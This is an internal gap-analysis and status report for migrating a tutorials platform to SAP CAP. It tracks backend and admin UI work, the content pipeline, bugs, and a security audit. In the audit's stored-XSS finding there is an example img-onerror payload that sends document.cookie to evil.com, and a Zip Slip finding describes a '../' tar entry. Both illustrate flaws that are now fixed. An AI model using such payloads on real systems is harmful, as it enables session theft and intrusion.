# Gap Analysis — tutorials-poc

## Executive Summary

The tutorials-poc project has a working **learner-facing frontend** (tutorial navigation, progress tracking, App Space event view), a **CAP backend** that is substantially complete, and a full **admin UI** (9 Fiori Elements apps + 1 freestyle SAPUI5 app). Tutorial content is served from **HANA BLOBs** (delta-aware publish pipeline validated end-to-end). The remaining gaps are: **content push pipeline** (dispatch workflow template only, not deployed to sap-tutorials repos), and a few backend edge cases not yet validated against production IMS.

---

## 1. CAP Backend Rewrite (Substantially Complete)

The rewrite documented in `docs/superpowers/plans/` has been **executed**. What exists now:

### Completed

- [x] **CDS Data Model** (`db/schema.cds`) — 35 entities covering all IMS tables: Tutorials, Missions, Groups, Steps, Checkpoints, Users, TaskRecords, Events, Prizes, PrizeRecords, Tags, Accomplishments, AccomplishmentRecords, CompletionPaths, CompletionPathItems, TutorialMeta, TutorialContributors, TutorialRepositories, UserMetaData, DeveloperEnvironmentTabs/Links, ActiveLearnerRecords, DashboardMonitoredRecords, StepFailures, NGDSFailedMessages, ImsConfig, JobLocks, PrimaryAccounts, SecondaryAccounts, PrivacyProtectionActions, FeaturedTasks, FailedEmails
- [x] **Tasks union view** (`db/views.cds`) — UNION ALL across Tutorials/Missions/Groups/Steps/Checkpoints with taskType discriminator
- [x] **NavigatorCatalog view** — Pre-joined view for build pipeline (mission → path → item → tutorial slug)
- [x] **LegacyKeyed aspect + legacy-id.js** — Sequence-backed integer IDs for backward compatibility
- [x] **DeveloperService** (`srv/developer-service.cds` + `.js`) — `completeStep`, `getProgress`, `createTaskRecord`, `findTaskProgressByUserAndTasksIds`, `countCompletedMissionsTotal/Percent`, `getEventProgress` (replaces AEM progress/series)
- [x] **Status calculator** (`srv/lib/status-calculator.js`) — Progress cascade from steps → tutorial
- [x] **Accomplishment evaluator** (`srv/lib/accomplishment-evaluator.js`) — Wired as `after('createTaskRecord')` hook
- [x] **AdminService** (`srv/admin-service.cds` + `.js`) — Full CRUD projections for all 25+ entities + admin actions (anonymize, cleanup, featured order, NGDS, sync, notifications, statistics, export)
- [x] **DisplayService** (`srv/display-service.cds` + `.js`) — Event buckets, burnup, track stats, completion speed, leaderboard
- [x] **ConsolidationService** (`srv/consolidation-service.cds` + `.js`) — `userMerge` + `getMergeStatus`
- [x] **~~STOMP WebSocket broker~~ → `@cap-js-community/websocket`** — Replaced custom `stomp-broker.js` with CDS-native WebSocket plugin. `EventStreamService` (`@protocol: ['websocket','rest']`) + `DisplayService` (`@protocol: ['odata','websocket']`). Socket.IO transport.
- [x] **Job scheduler** (`srv/jobs/scheduler.js`) — node-cron with distributed lock: step-failure cleanup (daily), active learner analytics (daily), NGDS retry (2h), account merge (daily), tag cleanup (biannual), tutorial metadata review (weekly), contributor notifications (weekly Mon 9am), email retry (4h)
- [x] **Job lock library** (`srv/jobs/job-lock.js`) — Database-backed distributed lock using JobLocks entity
- [x] **NGDS client** (`srv/lib/ngds-client.js`) + retry job (`srv/jobs/ngds-retry.js`)
- [x] **Adobe Analytics client** (`srv/lib/adobe-analytics.js`)
- [x] **Account merge** (`srv/lib/account-merge.js` + `srv/jobs/account-merge-job.js`)
- [x] **Tutorial sync** (`srv/lib/tutorial-sync.js`)
- [x] **Contributor notifications** (`srv/lib/contributor-notifications.js` + `srv/lib/mail-client.js`)
- [x] **QR code handler** (`srv/lib/qrcode-handler.js`) — Express route at `/api/qrcode`
- [x] **Build catalog** (`srv/lib/build-catalog.js`) — Unauthenticated `/build/catalog` for static site generation
- [x] **Navigator catalog** (`srv/lib/navigator-catalog.js`) — `/build/navigator` endpoint
- [x] **Tech user auth** (`srv/lib/tech-user-auth.js`) — Basic auth middleware for service-to-service calls
- [x] **server.js bootstrap** — CORS (dev), custom routes, auth endpoint (`/auth/user`), job registration, STOMP broker attachment

### Remaining Backend Gaps

- [x] **HANA sequences for legacyId** — 30 per-entity `.hdbsequence` files deployed in `db/src/`, START WITH 10000001 to avoid collision with migrated data; `legacy-id.js` validates entity names against known set
- [x] **Integration testing against real HANA** — Vitest workspace with `hybrid` project; 5 test files (schema-deploy, hana-sequences, views, developer-workflow, admin-crud) run via `npm run test:hybrid` using `cds bind --exec`
- [ ] **Adobe Analytics destination config** — Client exists but BTP Destination for `sap.d1.sc.omtrdc.net` may not be configured
- [ ] **NGDS destination config** — Client exists but BTP Destination not verified
- [ ] **Mail service binding** — `mail-client.js` exists but no BTP Mail Service instance confirmed
- [x] **Leaderboard cache** — All 5 DisplayService functions cached with 600s TTL per eventLegacyId (`srv/lib/ttl-cache.js`)
- [x] **Production smoke tests** — Smoke suite in `test/smoke/` validates health, public endpoints, auth enforcement, OData metadata, and static content post-deploy
- [x] **Plan checkboxes** — The 4 plan files in `docs/superpowers/plans/` still show all tasks unchecked; update them to reflect reality

---

## 2. Admin UI (Implemented — PR #1)

The IMS React 15 admin frontend has **11 pages** — all reimplemented as Fiori Elements V4 + freestyle SAPUI5:

- [x] Tutorial Dashboard (freshness/ownership tracking) — freestyle SAPUI5 grid table view
- [x] Mission Management (nested completion paths) — Fiori Elements List Report + Object Page with draft
- [x] Groups Management (CRUD) — Fiori Elements List Report + Object Page with draft
- [x] Events Management (CRUD) — Fiori Elements List Report + Object Page with draft
- [x] Privacy/GDPR Tools (lookup + anonymize) — freestyle SAPUI5 wizard view
- [x] Board/Analytics Dashboard (KPIs + charts) — freestyle SAPUI5 Board view
- [x] Featured Tasks Curation — Fiori Elements List Report (Operations app)
- [x] Prizes Management (simple CRUD) — Fiori Elements List Report + Object Page
- [x] Accomplishments Management (rule-based badges) — Fiori Elements List Report + Object Page with draft
- [x] Statistics Export (CSV download) — freestyle SAPUI5 export view
- [x] Tags (read-only table) — Fiori Elements List Report
- [x] **Change Tracking** — Implemented `@cap-js/change-tracking` for Admin UI audit trail. 7 entities tracked (Events, Missions, Groups, Accomplishments, Prizes, ImsConfig, FeaturedTasks). Change History tab on all Object Pages via `changes/@UI.PresentationVariant` facet. Tracks field-level changes with who/when/what.
- [x] **UI5 Dev Server plugin (`cds-plugin-ui5`)** — Integrated: all 10 admin apps served via `cds watch` using `file:` devDependencies for nested Fiori Elements apps + direct detection for `admin-custom`. Mount paths configured in `package.json` under `cds.cds-plugin-ui5.modules`. No separate UI dev server needed.
- [x] **Audit Logging plugin (`@cap-js/audit-logging`)** — Implemented: `@PersonalData` annotations on `Users` (DataSubject), `UserMetaData`, `TaskRecords` (DataSubjectDetails). SecurityEvent emitted on anonymization. MTA resource bound (`auditlog` premium plan). Logs to console in dev, routes to SAP Audit Log Service in production. 9 unit tests in `test/audit-logging.test.js`.

---

## ~~3. AEM Endpoints~~ **REMOVED**

All 8 AEM endpoints have been replaced by CAP and the AEM proxy layer has been decommissioned. The `scripts/parsers/aem.ts` file has been deleted.

---

## 4. Content Push Pipeline ✅

Dispatch template in `docs/tutorial-repo-dispatch.yml`. Receiving workflow in `.github/workflows/rebuild-content.yml`. AppRouter rebuild handler in `approuter/server.js` (atomic directory swap with rollback).

- [x] Create dispatch workflow template (`docs/tutorial-repo-dispatch.yml`)
- [x] Create receiving workflow (`.github/workflows/rebuild-content.yml`) — triggers on `repository_dispatch` type `tutorial-updated` + manual `workflow_dispatch`
- [x] Implement AppRouter rebuild endpoint (`/admin/rebuild`) — receives gzipped tarball, atomic swap
- [ ] Install dispatch workflow in sap-tutorials repos (or at org level via reusable workflow)
- [ ] Fill in `<OWNER>` placeholder in the dispatch URL (`sap-tutorials/tutorials-poc`)
- [ ] Configure `TUTORIALS_DISPATCH_TOKEN` secret (GitHub PAT with repo scope)
- [ ] Configure `REBUILD_API_KEY` secret in tutorials-poc repo (for workflow → AppRouter auth)
- [ ] Configure `TUTORIALS_GITHUB_TOKEN` secret (for fetch-tutorials to access sap-tutorials org)

---

## 5. Static Content Update Webhook ✅

Solved via the content push pipeline above — the receiving workflow POSTs a content tarball directly to the running AppRouter. No full MTA redeploy needed.

- [x] Decide on delivery approach: **Custom rebuild endpoint** (dispatch → rebuild → POST tarball to AppRouter `/admin/rebuild`)
- [x] Implement CI/CD pipeline (`.github/workflows/rebuild-content.yml`)
- [ ] Test end-to-end: tutorial commit → dispatch → rebuild → deployed content updated

---

## 6. Real-Time Event Display ✅

- [x] WebSocket subscription in AppSpace.vue — real-time `tutorialCompleted` events via Socket.IO with confetti + toast celebration effects
- [x] Display UI equivalent (big-screen dashboard for events) — `display-app/` rewritten from STOMP to Socket.IO (`display-app/src/event-stream.ts`)
- [x] **Replaced custom STOMP broker with `@cap-js-community/websocket` plugin** — CDS-native WebSocket via `@protocol: 'websocket'` annotation. Removed `srv/lib/stomp-broker.js`. `EventStreamService` (unauthenticated kiosk displays) at `/ws/event-stream` + `/rest/event-stream`. `DisplayService` dual-protocol at `/display`. Context-based filtering via `wsContext` emit. Smoke tests verify Socket.IO handshake and REST endpoint.

---

## 7. Backend Subsystems — Porting Status

### Implemented (code exists, needs production validation)

- [x] Notification System — `contributor-notifications.js` + `mail-client.js` + weekly cron job; **gap: BTP Mail Service binding not confirmed**
- [x] NGDS Sync — `ngds-client.js` + 2-hour retry job + `NGDSFailedMessages` entity; **gap: BTP Destination not configured**
- [x] Adobe Analytics — `adobe-analytics.js` client; **gap: destination config + verify event format matches IMS**
- [x] Account Merge — `account-merge.js` + daily batch job + ConsolidationService endpoints; **gap: test with real SCI calls**
- [x] Accomplishment Evaluator — `accomplishment-evaluator.js` wired as `after('createTaskRecord')` hook
- [x] Leaderboard/Rankings — `DisplayService.getLeaderboard` function; **gap: no cache layer (IMS uses 600s TTL)**
- [x] Featured Tasks — `FeaturedTasks` entity + `AdminService.setFeaturedOrder` action
- [x] Active Learner Stats — `analytics.js` + daily cron job writing `ActiveLearnerRecords`
- [x] Step Failure Cleanup — `cleanup.js` + daily cron (90-day retention)
- [x] Tag Cleanup — `cleanup.js` + biannual cron (Jan/Jul)

### Not Yet Implemented

- [x] **Email retry dashboard** — `FailedEmails` entity exposed in Operations admin app (Fiori Elements List Report)
- [x] **NGDS failed message inspector** — `NGDSFailedMessages` entity exposed in Operations admin app (Fiori Elements List Report)
- [x] **Notification 4-stage escalation** — Fixed: `reviewTutorial` action resets escalation to 0, `snoozeTutorial` delays without resetting level, `before UPDATE` hook auto-resets on reviewedDate change. Fixes longstanding IMS bug where notifications never cleared after review.
- [x] **Research: Telemetry plugin (`@cap-js/telemetry`)** — Installed and configured. Console tracing in dev/hybrid (hierarchical timing breakdowns), SAP Cloud Logging export in production via gRPC. Sampler ignores `/health` endpoints. Cloud-logging service added to mta.yaml. See <https://cap.cloud.sap/docs/plugins/#telemetry>
- [x] **ORD plugin (`@cap-js/ord`)** — Installed and configured. All 6 CDS services discoverable at `/.well-known/open-resource-discovery` and `/ord/v1/documents/ord-document`. Namespace: `sap.tutorials`, visibility: public, auth: open. AppRouter routes added. Smoke tests added. See <https://cap.cloud.sap/docs/plugins/#ord-open-resource-discovery>
- [x] **Swagger UI (`cds-swagger-ui-express`)** — Installed as CDS plugin (devDependency). Auto-activates in development via `[development].swagger` profile config in package.json. Swagger UI available at `/$api-docs/{service-path}` for all 6 services (e.g., `http://localhost:4004/$api-docs/api` for DeveloperService). Includes interactive OpenAPI explorer with auto-generated specs from CDS definitions. Disabled in production (no config = plugin skips). See <https://www.npmjs.com/package/cds-swagger-ui-express>

---

## 8. Priority Ranking (Updated)

| # | Gap | Impact | Effort | Status |
|---|-----|--------|--------|--------|
| 1 | Content push pipeline (dispatch + receiving workflow) | Blocks author workflow | Low | **Done** — workflow + rebuild handler implemented |
| 2 | Static content webhook (CI/CD redeploy) | Blocks production content updates | Medium | **Done** — solved by HANA content persistence + rebuild endpoint |
| 3 | AEM endpoint retirement (0 remaining) | Blocks AEM decommission | Medium | **Done** — all 8 wired to CAP |
| 4 | Admin UI — Tutorial Dashboard | Blocks content operations | High | **Done** — PR #1 |
| 5 | Admin UI — Missions + Groups CRUD | Blocks content curation | High | **Done** — PR #1 |
| 6 | BTP service bindings (Mail, NGDS dest, Analytics dest) | Blocks production job execution | Medium | Code done, config needed |
| 7 | GDPR/Privacy tools (admin UI) | Compliance risk | Medium | **Done** — PR #1 |
| 8 | Integration testing on HANA | Confidence in deploy | Medium | **Done** — 100 tests passing |
| 9 | Real-time display (frontend WebSocket) | Event experience degradation | Medium | **Done** — `@cap-js-community/websocket` + Socket.IO |
| 10 | Plan doc cleanup | Housekeeping | Low | Plans show unchecked but work is done |

---

## 9. Immediate Action Items

- [ ] Deploy the dispatch workflow to at least one sap-tutorials repo as proof-of-concept
- [x] Create the receiving workflow in tutorials-poc (`.github/workflows/rebuild-content.yml`)
- [x] Wire all AEM endpoints to CAP (progress series, search, QR code — all complete)
- [ ] Configure BTP Destinations for NGDS and Adobe Analytics
- [x] Verify `cds deploy --to hana` succeeds with the full 35-entity schema (see §11)
- [x] Decide on static content delivery — rebuild endpoint on AppRouter (`/admin/rebuild`)

---

## 10. Reported Bugs (Team Feedback 2026-04-29)

- [x] **App Space not showing data** — Root cause: EventDisplay required an `imsUrl` URL parameter (legacy from Java IMS era). Fixed by removing the parameter and using relative URLs via AppRouter proxy. Also added `/rest/` route to `xs-app.json`. AppSpace.vue itself was already using relative paths correctly.
- [x] **Dark mode toggle not working** — Root cause: `toggleTheme()` handler only existed in `tutorial.ts` (loaded only on tutorial detail pages). Fixed by moving the click delegation handler to the inline `<script>` in `head.html` (runs on all pages). Also fixed toggle alignment in shellbar (added explicit height, line-height:0, centered thumb).
- [x] **Mission/Group pages return 404** — Fixed: `build-catalog.js` now falls back to `String(legacyId)` when slug is null, ensuring pages are always generated. The `/build/slug-mapping` endpoint and `populate-slugs` migration provide paths to backfill friendly slugs.

---

## 11. Fresh HDI Container Deploy ✅ (2026-05-02)

**Completed.** Fresh HDI container created, all 33 migration tables + views + 30 sequences deployed via `cds deploy --to hana`. Data migrated from Java IMS HANA (IMSDBUSER schema) via direct HANA-to-HANA script. Autotest data purged (97% of missions, 95% of tutorials were automated test records). 100 hybrid tests passing against the clean dataset.

Final dataset: 602 missions, 596 tutorials, 65 events, 5605 tags, 247K users, 2.5M task records.

---

## 12. HANA Content Persistence ✅ (2026-05-02)

**Completed.** Full end-to-end validation of the content publish → serve pipeline using real HANA Cloud. Tutorial HTML is stored as gzip-compressed BLOBs in `ContentFiles` with versioned manifests (`ContentManifest`). Delta-aware publishing via SHA-256 hash comparison.

### Pipeline Verification Results

| Test | Result |
|------|--------|
| Initial publish (3 tutorials, v1) | 965ms, all files stored |
| Delta detect & re-publish 1 changed file (v2) | 859ms, only changed file uploaded |
| Serve from HANA BLOB | 200 + correct decompressed HTML |
| ETag → 304 Not Modified | Works |
| LRU cache hit (`X-Content-Source: cache`) | Works |
| Updated ETag after v2 publish | New hash served correctly |
| Stale ETag → fresh 200 | Confirmed |
| 404 for missing slug | Confirmed |
| Unit tests (SQLite path) | 22/22 pass |

### HANA LOB Locator Fix

**Bug:** CDS QL returns HANA BLOB columns as `Readable` streams backed by LOB locators. When mixed with non-BLOB columns in a single SELECT, the locator expires before stream consumption — "invalid lob locator id (piecewise lob reading)".

**Fix in `srv/lib/content-store.js`:** Split content serving into two queries:
1. Metadata query (no BLOB) — handles ETag/304 without touching the LOB
2. BLOB-only query using raw SQL on HANA (`db.run()` returns Buffer directly)

Database-kind detection ensures SQLite (unit tests) still uses CDS QL, while HANA uses raw SQL for reliable BLOB retrieval. This also provides a performance benefit: most requests (cache hits + 304s) never read the BLOB at all.

### HDI Migration Tables

- `db/src/com.sap.developers.ims.ContentFiles.hdbmigrationtable` — slug, version, content (BLOB), contentHash, sizeBytes, compressedBytes, mimeType
- `db/src/com.sap.developers.ims.ContentManifest.hdbmigrationtable` — version (PK), status, trigger, fileCount, totalSizeBytes, changedSlugs, hugoVersion, publishDurationMs

---

## 13. Content Pipeline Lifecycle Tests (TODO)

End-to-end tests verifying that tutorial create/update/delete flows propagate correctly through the entire pipeline: GitHub fetch → parse → Hugo build → publish to HANA → serve from HANA.

### 13.1 New Tutorial Created

- [ ] **Fetch stage** — New repo/file added to `POC_TUTORIALS` array is fetched and cached in `.tutorial-cache/`
- [ ] **Parse stage** — Parser produces valid Hugo frontmatter + step content from raw markdown (V1 or V2 format detected correctly)
- [ ] **Hugo build stage** — Generated `hugo/content/tutorials/<slug>.md` produces `hugo/public/tutorials/<slug>/index.html`
- [ ] **Publish stage** — `publish-content.ts` detects new slug (not in `/content/hashes`), uploads gzip-compressed BLOB to HANA via `POST /content/publish`
- [ ] **Manifest stage** — New `ContentManifest` version created with status `ACTIVE`, `ContentFiles` row inserted with correct slug, version, contentHash, sizeBytes
- [ ] **Serve stage** — `GET /content/tutorials/<new-slug>` returns 200 with decompressed HTML, correct `Content-Type`, `ETag`, and `Cache-Control` headers
- [ ] **Navigation stage** — `GET /content/nav` includes the new tutorial in its response
- [ ] **Hash registry** — `GET /content/hashes` now includes the new slug with its SHA-256 hash

### 13.2 Existing Tutorial Updated

- [ ] **Fetch stage** — Modified markdown in source repo updates the `.tutorial-cache/` entry (cache invalidation works)
- [ ] **Parse stage** — Changed content (new step added, text modified, image updated) produces updated Hugo markdown
- [ ] **Hugo build stage** — Rebuilt `index.html` reflects the content change
- [ ] **Delta detection** — `publish-content.ts` compares local SHA-256 against `/content/hashes` and identifies only the changed slug(s)
- [ ] **Publish stage** — Only the changed tutorial is uploaded (not the entire set); `--dry-run` correctly reports the delta without uploading
- [ ] **Manifest stage** — New manifest version created; previous version marked `SUPERSEDED`; `changedSlugs` field lists only the updated slug
- [ ] **Serve stage** — `GET /content/tutorials/<slug>` returns updated HTML with a **new ETag** (old ETag returns fresh 200, not stale 304)
- [ ] **Cache invalidation** — LRU cache evicts stale entry; `X-Content-Source` transitions from `cache` → `db` on first request post-publish
- [ ] **Rollback** — `POST /content/rollback` reverts to previous manifest version; serving returns the old content

### 13.3 Tutorial Deleted (Removed from Pipeline)

- [ ] **Fetch stage** — Tutorial removed from `POC_TUTORIALS` array is no longer fetched; `.tutorial-cache/` entry can be manually cleared
- [ ] **Hugo build stage** — No `hugo/content/tutorials/<slug>.md` generated; no corresponding `index.html` in `hugo/public/`
- [ ] **Publish stage** — `publish-content.ts` publishes remaining tutorials only; the deleted slug is **not** in the new manifest's file set
- [ ] **Manifest stage** — New manifest version has `fileCount` decremented by 1; deleted slug absent from `ContentFiles` at new version
- [ ] **Serve stage** — `GET /content/tutorials/<deleted-slug>` returns 404 (latest manifest has no entry for this slug)
- [ ] **Hash registry** — `GET /content/hashes` no longer includes the deleted slug
- [ ] **Navigation stage** — `GET /content/nav` no longer lists the deleted tutorial
- [ ] **Content GC** — Old `ContentFiles` rows for the deleted slug (from prior versions) are eligible for garbage collection after 7 days (3-version retention still applies for rollback)

### Implementation Notes

These tests should be implemented across multiple test tiers:

| Tier | Scope | What to test |
| ---- | ----- | ------------ |
| **Unit** (`test/lib/content-store.test.js`) | Publish + serve + manifest logic | Extend existing 22 tests with create/update/delete lifecycle sequences |
| **Integration** (`test/integration/`) | Full pipeline from parse → publish → serve | New test file: `content-pipeline-lifecycle.test.js` — uses in-memory SQLite, mocks GitHub fetch, runs real parser + publish logic |
| **Hybrid** (`test/hybrid/`) | Real HANA BLOB storage | Extend with publish → serve → rollback → GC verification against actual HANA |
| **Smoke** (`test/smoke/content-serve.test.js`) | Deployed system validation | Extend with pre/post publish content verification (requires `CONTENT_API_KEY` in CI) |

---

## 14. Security Review ✅ (2026-05-01)

First comprehensive security audit of the full implementation. Findings ranked by exploitability confidence (≥80%).

### HIGH Severity

#### 12.1 Path Traversal via Tar Extraction — `approuter/server.js:40`

| Field | Detail |
|-------|--------|
| Category | Path Traversal |
| Confidence | 10/10 |
| Status | [x] Fixed |

**Description:** The `/admin/rebuild` endpoint extracts a tar.gz archive using `tar.extract({ cwd: TEMP_DIR })` with no `filter` callback. Node-tar without a filter extracts entries containing `../` path components, allowing writes to arbitrary filesystem locations outside TEMP_DIR (classic "Zip Slip" vulnerability).

**Exploit Scenario:** An attacker who possesses or brute-forces the `REBUILD_API_KEY` bearer token crafts a `.tar.gz` with an entry named `../../xs-app.json`. Extraction overwrites the AppRouter route config, enabling unauthenticated access to admin endpoints.

**Fix:** Add a `filter` option to `tar.extract` that rejects entries containing `..` path segments or absolute paths. Or upgrade to node-tar >= 7.x which rejects `../` entries by default.

---

#### 12.2 Stored XSS via Unsanitized Tutorial HTML — `hugo/hugo.toml:11`

| Field | Detail |
|-------|--------|
| Category | XSS (Stored) |
| Confidence | 9/10 |
| Status | [x] Fixed |

**Description:** Hugo's Goldmark renderer is configured with `unsafe = true`, meaning raw HTML in tutorial markdown is rendered directly into pages. The Hugo build path has **no HTML sanitization** (confirmed by test assertion in `hugo-write.test.ts`). The CSP header includes `script-src 'unsafe-inline'`, providing zero browser-level mitigation.

**Exploit Scenario:** A contributor with write access to any `sap-tutorials` repo inserts `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` into a tutorial step. The build pipeline passes this through unmodified, Hugo renders it as live HTML, and the CSP allows inline script execution. Every authenticated visitor has their session stolen.

**Fix (layered):**
1. Add HTML sanitization (allowlist of safe tags) in the Hugo write path — similar to the existing VitePress path's `escapeHtmlTags`
2. Remove `'unsafe-inline'` from the `script-src` CSP directive (use nonces)
3. Consider `unsafe = false` if tutorials only need standard markdown + Hugo shortcodes

---

### MEDIUM Severity

#### 12.3 Open Redirect via URL Parameter — `display-app/src/App.vue:167`

| Field | Detail |
|-------|--------|
| Category | Open Redirect / Phishing |
| Confidence | 9/10 |
| Status | [x] Fixed |

**Description:** The display app reads `participateUrl` from URL query parameters without validation and renders it as a QR code + clickable `<a href>` link. Any URL (including phishing sites) can be injected.

**Fix:** Validate against an allowlist of permitted domains (e.g., `*.sap.com`, `*.hana.ondemand.com`) and reject `javascript:` / `data:` schemes.

---

#### 12.4 Unauthenticated Endpoints Leak Database Error Details — `srv/server.js:27-34`

| Field | Detail |
|-------|--------|
| Category | Data Exposure |
| Confidence | 8/10 |
| Status | [x] Fixed |

**Description:** `/health/db`, `/build/catalog`, and `/build/navigator` (all unauthenticated) return raw `err.message` from database failures. HANA errors typically include hostnames, ports, and connection parameters.

**Fix:** Return generic error messages to unauthenticated callers; log details server-side only.

---

#### 12.5 Timing Side-Channel in Password Comparison — `srv/lib/tech-user-auth.js:57`

| Field | Detail |
|-------|--------|
| Category | Authentication Weakness |
| Confidence | 8/10 |
| Status | [x] Fixed |

**Description:** Basic Auth password comparison uses `!==` (short-circuits on first differing character). Tech users get `Admin` role on success. Timing analysis can progressively reveal the password.

**Fix:** Use `crypto.timingSafeEqual` with fixed-length buffers.

---

#### 12.6 Unauthenticated WebSocket Event Stream — `srv/event-stream-service.cds:2`

| Field | Detail |
|-------|--------|
| Category | Missing Authentication |
| Confidence | 8/10 |
| Status | [x] Accepted Risk |

**Description:** `EventStreamService` has `@requires: 'any'` (anonymous access). Anyone can connect via WebSocket and passively monitor real-time tutorial completion activity across all events.

**Accepted Risk:** This is intentional by design. The display app runs on unauthenticated kiosk monitors at SAP events and needs the WebSocket stream without login prompts. The data exposed (tutorial completion counts, anonymized activity) is non-sensitive — it's the same information shown on public event screens. No personal data (emails, user IDs) is broadcast over this channel.

---

### Positive Security Observations

- All CDS service handlers use parameterized CQL queries — no SQL injection in standard operations
- DeveloperService, AdminService, DisplayService, ConsolidationService all have proper `@requires` annotations
- No `eval()`, `exec()`, `spawn()`, or dynamic code execution anywhere in `srv/`
- No filesystem path traversal in service handlers (only hardcoded `process.cwd()` joins)
- `@cap-js/audit-logging` with `@PersonalData` annotations provides GDPR-compliant data access logging
- `@cap-js/change-tracking` provides audit trail for admin entity modifications
- Vue 3 apps use zero `v-html` directives — all content uses safe `{{ }}` interpolation

---

## 15. Validation Questions Pipeline

**Priority:** Medium | **Effort:** Medium | **Status:** Completed

**Task:** Test and document how validation questions (step quizzes) are populated from the content pipeline. Currently the `VALIDATION_DATA` object in `scripts/fetch-tutorials.ts` is hardcoded — verify whether this should be pulled dynamically from tutorial frontmatter or a CAP entity, and ensure the pipeline fills them correctly end-to-end.

---

## 16. Pipeline Execution Log (DB + Admin UI)

**Priority:** Medium | **Effort:** Medium | **Status:** Completed

**Task:** Create a `PipelineLog` entity to persist pipeline execution records (build triggers, content publishes, MTA deploys, scheduled jobs) and add an admin UI view to browse/filter them. Should capture: timestamp, pipeline type (enum: content-publish, hugo-build, mta-deploy, scheduled-job, github-dispatch), status (success/fail/running), duration, initiator (user or system), and summary/error details. Wire into the existing content-store publish flow and job scheduler. Expose in the admin shell as a "Pipeline Log" tab in the Operations component. Only keep records for 30 days.

---

## 17. Migrate Scanner Application

**Priority:** Medium | **Effort:** Large | **Status:** Done

**Task:** Migrate the scanner application into this project. Consolidate it as a module within this MTA so it shares the same XSUAA, destination, and HANA bindings. Determine whether it should be a separate CAP service or integrated into the existing srv module.

**Resolution:** Integrated as a separate CDS service (`srv/scanner-service.cds` + `.js`) at `/scanner`. Queries local DB entities directly instead of calling IMS via BTP Destination. UI5 app ported to `app/scanner/webapp/`, served at `/scanner-ui/` via approuter. No new dependencies — uses existing HANA/XSUAA bindings.

---

## 17. Scanner UI — Vue with Fiori Styles

**Priority:** Medium | **Effort:** Medium | **Status:** Done

**Task:** Rewrite the scanner UI using Vue 3 with SAP Fundamental Styles (same pattern as `apps/`). Replace the current UI framework with a Vue + Vite build that uses `@aspect/fundamental-styles` or equivalent Horizon-themed components, consistent with the rest of this project's frontend approach.

**Resolution:** Created parallel Vue 3 implementation at `/scanner-vue/` alongside existing UI5 app. Files: `apps/src/scanner-vue/` (main.ts, ScannerApp.vue, types.ts, useBarcodeScanner.ts, useScannerApi.ts), `hugo/layouts/scanner-vue/list.html` (standalone layout), `hugo/content/scanner-vue/_index.md`. Uses native BarcodeDetector API with manual JSON fallback. Mobile-first with SAP Fundamental Styles classes, Horizon theme vars, safe-area insets, and touch-optimized targets. Builds as `scanner-vue.js` (13 kB / 4.2 kB gzip). Route in xs-app.json with XSUAA auth.

---

## 18. Reported Bugs (2026-05-04)

- [X] **Tutorials in Navigator missing details** — Tutorial cards show only the slug as the title, "Beginner" level, and "0 min." duration. No real title, description, actual duration, or tag content is displayed. Likely the `/build/navigator` endpoint or the `NavigatorCatalog` view is not joining/returning tutorial metadata (title, description, time, experience level) from the `Tutorials` or `TutorialMeta` entities.
- [X] **SAP logo needs replacing** — The shellbar shows a placeholder "SA H" initials circle instead of the actual SAP logo. Need to replace with the proper SAP logo image/SVG.
- [X] **Breadcrumb navigation broken in tutorial pages** — The breadcrumb/navigation in the tutorial detail view is not formatted correctly. Shows raw "Tutorial Navigator • / • Create a Simple ABAP Daemon" with bullet separators and a bare "/" instead of proper styled breadcrumb links (e.g., "Tutorial Navigator > Group Name > Tutorial Title").
- [X] **Breadcrumb navigation broken in mission/group pages** — Different issue from tutorials: breadcrumb shows "Tutorial Navigator" link concatenated directly with the slug (e.g., "Tutorial Navigatortest_mission_ims") with no separator or spacing. Also missing proper title — displays raw slug "test_mission_ims" as both the breadcrumb text and the page heading, with placeholder metadata ("Beginner · 0 min. · 0 Tutorials · 1 Groups").
- [X] **Login redirects away from current page** — When logging in from a detail page (tutorial, mission, or group), the user is redirected back to the Tutorial Navigator home page instead of remaining on the page they were viewing. The login flow should preserve the current URL and return the user to the same page after authentication.
- [X] **Logout button broken (404)** — The logout button navigates to `/logout` but no route exists in `approuter/xs-app.json` to handle it. Need to add a logout route that triggers the AppRouter's XSUAA logout flow (typically `"authenticationType": "xsuaa"` with `"target": "/logout"` or using the AppRouter's built-in `/logout` endpoint which requires explicit route configuration).
- [X] **Topic/Software Product filters regressed to search boxes** — The "Topic" and "Software Product" filter fields in the Navigator used to be checkbox lists (auto-populated from available tags) that you could tick to filter results. They have regressed to plain text search inputs. Need to restore the checkbox-list behavior populated from the tag/product taxonomy.
- [ ] **"Done" button in tutorial steps doesn't work** — Clicking the "Done" button on a tutorial step has no effect. Should mark the step as completed (call `completeStep` or `createTaskRecord` on the DeveloperService) and update the step's visual state (fill the circle indicator, advance progress).
- [ ] **Event Display WebSocket connection error** — The Event Display page reports a WebSocket connection error. The display app uses Socket.IO to connect to the `EventStreamService` at `/ws/event-stream`. Likely a routing issue in `xs-app.json` (missing WebSocket upgrade route) or the Socket.IO path not matching what the deployed CAP server exposes.
- [ ] **`/_dev` endpoint returns "Cannot GET"** — The CAP dev tools endpoint (`/_dev`) that exposes the index page and Swagger UI is not working on the deployed instance. May be disabled in production profile, missing route in `xs-app.json`, or the express middleware not registering correctly outside local `cds watch`.
- [ ] **Display app WebSocket connection error** — The standalone display dashboard (`display-app/`) also fails to establish a WebSocket connection. Same root cause as the Event Display issue — Socket.IO cannot reach the `EventStreamService` or `DisplayService` WebSocket endpoints on the deployed instance.
- [ ] **Admin UI side nav: child items not indented** — When expanding a folder node (e.g., "Content", "Rewards", "System") in the admin shell's `sap.tnt.ToolPage` side navigation, the child items (Events, Missions, etc.) appear at the same indent level as the parent. Need to add left padding/indent to child navigation items so the hierarchy is visually clear.
- [ ] **Admin UI: Fiori Elements row navigation broken** — Clicking the chevron (">") on a row in the Events list report (and likely other Fiori Elements apps) does nothing — should navigate to the Object Page detail view for that record. The "Create" button also doesn't work. Likely a routing issue in how the admin shell hosts the Fiori Elements components (component container not wiring the inner router, or `manifestFirst` / hash-based routing conflicts between the shell and the embedded apps).
- [ ] **Admin UI: No back navigation from detail/object pages** — Once you navigate into a detail screen (e.g., Mission Object Page), there is no "Back" button or breadcrumb to return to the list report. The Fiori Elements Object Page normally shows a back arrow in the page header, but the admin shell likely suppresses or doesn't propagate the shell-back event. Need to wire up back navigation between the shell and the embedded component's inner router.
